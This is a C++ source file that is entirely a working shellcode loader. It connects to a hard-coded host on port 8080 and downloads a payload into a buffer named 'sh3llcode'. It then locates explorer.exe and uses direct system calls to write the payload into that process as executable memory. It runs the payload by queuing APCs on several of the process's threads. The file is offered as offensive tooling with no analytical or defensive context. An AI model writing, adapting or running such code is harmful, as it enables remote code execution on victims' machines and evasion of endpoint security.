#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include "syscalls_all.h"
#include <stdio.h>
//#include <winsock2.h>
#pragma warning(disable:4996)
//Winsock Library
#pragma comment(lib,"ws2_32.lib")


int main(int argc, char** argv)
{
WSADATA wsa;
SOCKET s;
struct sockaddr_in server;
char* message;
char sh3llcode[2048];
int recv_size;

if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
{
    return 1;
}

if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
{
}
server.sin_addr.s_addr = inet_addr("192.168.211.129");
server.sin_family = AF_INET;
server.sin_port = htons(8080);

if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
{
    return 1;
}

if ((recv_size = recv(s, sh3llcode, 2048, 0)) == SOCKET_ERROR)

sh3llcode[recv_size];
   
LPVOID allocationstart;
SIZE_T allocationsize = sizeof(sh3llcode);
HANDLE hThread;
HANDLE hProcess;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
    DWORD dwProcessId;

    if (Process32First(snapshot, &processEntry)) {
        while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
            Process32Next(snapshot, &processEntry);
        }
    }
    dwProcessId = processEntry.th32ProcessID;

    OBJECT_ATTRIBUTES pObjectAttributes;
    InitializeObjectAttributes(&pObjectAttributes, NULL, NULL, NULL, NULL);

    CLIENT_ID pClientId;
    pClientId.UniqueProcess = (PVOID)processEntry.th32ProcessID;
    pClientId.UniqueThread = (PVOID)0;

    allocationstart = nullptr;
    NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &pObjectAttributes, &pClientId);
    NtAllocateVirtualMemory(hProcess, &allocationstart, 0, (PULONG)&allocationsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    NtWriteVirtualMemory(hProcess, allocationstart, sh3llcode, sizeof(sh3llcode), 0);


    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
    std::vector<DWORD> threadIds;
    if (Thread32First(snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
                threadIds.push_back(threadEntry.th32ThreadID);
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }

    int count = 0;
    for (DWORD threadId : threadIds) {

        OBJECT_ATTRIBUTES tObjectAttributes;
        InitializeObjectAttributes(&tObjectAttributes, NULL, NULL, NULL, NULL);

        CLIENT_ID tClientId;
        tClientId.UniqueProcess = (PVOID)dwProcessId;
        tClientId.UniqueThread = (PVOID)threadId;

        NtOpenThread(&hThread, MAXIMUM_ALLOWED, &tObjectAttributes, &tClientId);
        NtSuspendThread(hThread, NULL);
        NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)allocationstart, allocationstart, NULL, NULL);
        NtResumeThread(hThread, NULL);
        count++;

        if (count == 3) {
            break;
        }
    }
}